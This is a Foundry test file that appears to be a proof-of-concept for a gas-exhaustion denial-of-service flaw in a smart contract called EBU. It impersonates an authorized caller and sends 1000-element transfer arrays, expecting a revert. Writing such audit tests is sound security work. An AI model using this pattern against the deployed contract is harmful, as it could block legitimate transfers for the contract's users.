// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c.sol";

contract EBUTest is Test {
    EBU public ebu;
    address constant AUTHORIZED_ADDRESS = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;
    uint256 largeArraySize = 1000;

    function setUp() public {
        // Deploy the contract
        ebu = new EBU();
    }

    function test_transferDenialOfService() public {
        // Create large arrays to trigger gas exhaustion
        address[] memory tos = new address[](largeArraySize);
        uint256[] memory values = new uint256[](largeArraySize);

        for (uint256 i = 0; i < largeArraySize; i++) {
            tos[i] = address(0); // Using zero address for simplicity
            values[i] = 1;
        }

        // Get initial contract stats
        console2.log("--- BEFORE-Trigger Stats ---");
        (uint256 totalAmountBefore, uint256 totalTransfersBefore) = ebu.getTotalStats();
        console2.log("Total Amount Before: ", totalAmountBefore);
        console2.log("Total Transfers Before: ", totalTransfersBefore);
        
        console2.log("--- Trigger Transfer (should revert) ---");
        // Impersonate authorized caller with DoS attempt
        vm.startPrank(AUTHORIZED_ADDRESS);
        vm.expectRevert(); // Expect any revert due to gas exhaustion
        ebu.transfer(tos, values);
        vm.stopPrank();
        console2.log("Transfer successfully reverted!");

        console2.log("--- AFTER-Trigger Stats ---");
        (uint256 totalAmountAfter, uint256 totalTransfersAfter) = ebu.getTotalStats();
        console2.log("Total Amount After: ", totalAmountAfter);
        console2.log("Total Transfers After: ", totalTransfersAfter);

        // Compare pre/post states
        bool stateUnchanged = (totalAmountAfter == totalAmountBefore) && 
                              (totalTransfersAfter == totalTransfersBefore);
        console2.log("State unchanged? ", stateUnchanged ? "Yes" : "No");
        
        // Final vulnerability verdict
        if (stateUnchanged) {
            console2.log("Vulnerability Exists: Transaction reverted with no state changes due to excessive gas consumption");
        } else {
            console2.log("Vulnerability not Exist: State changed unexpectedly despite revert");
        }
    }
}